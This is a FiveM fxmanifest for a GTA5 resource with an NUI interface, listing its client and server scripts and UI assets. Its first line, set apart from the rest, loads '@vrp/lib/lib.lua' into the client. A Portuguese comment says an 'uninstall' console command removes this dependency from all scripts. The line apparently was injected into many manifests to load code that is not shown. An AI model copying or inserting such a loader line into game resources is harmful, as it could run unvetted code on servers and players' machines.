client_script "@vrp/lib/lib.lua" --Para remover esta pendencia de todos scripts, execute no console o comando "uninstall"

fx_version "adamant"
game "gta5"

ui_page "nui/index.html"

client_scripts {
	"@vrp/lib/utils.lua",
	"client.lua"
} 

server_script {
	"@vrp/lib/utils.lua",
	"server.lua"
}

files {
	"nui/index.html",
	"nui/*.js",
	"nui/style.css",
	"nui/img/*.svg",
	"nui/img/*.png",
	"nui/sounds/*.ogg",
	"nui/fonts/*.ttf",
	"nui/fonts/*.otf"
}              